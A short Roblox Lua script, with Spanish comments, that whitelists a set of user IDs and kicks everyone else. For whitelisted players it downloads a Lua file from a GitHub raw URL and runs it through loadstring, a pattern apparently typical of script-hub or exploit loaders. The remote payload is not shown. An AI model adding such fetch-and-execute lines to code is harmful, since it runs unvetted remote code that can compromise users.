-- Lista de usuarios autorizados (coloca sus ID de Roblox aquí)
local authorizedUsers = {
    [11983311] = true, -- Ejemplo de ID de usuario
    [173558280] = true,
    [352840804] = true,
    [2889846531] = true,
    [997463440] = true,
    [2734193943] = true,
}

-- Función para verificar si un usuario está autorizado
local function isUserAuthorized(userId)
    return authorizedUsers[userId] == true
end

-- Función para echar a un jugador con un mensaje
local function kickPlayer(player, message)
    player:Kick(message)
end

-- Evento que se activa cuando un jugador entra al juego
local function onPlayerAdded(player)
    if not isUserAuthorized(player.UserId) then
        kickPlayer(player, "You are not authorized.")
    else
        print("Loading Script...")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenxdkd/test/main/vpn.lua"))()
    end
end

-- Conectar el evento PlayerAdded a la función onPlayerAdded
game.Players.PlayerAdded:Connect(onPlayerAdded)

-- Verificar si hay jugadores en el juego antes de que se active el evento PlayerAdded
for _, player in ipairs(game.Players:GetPlayers()) do
    onPlayerAdded(player)
end
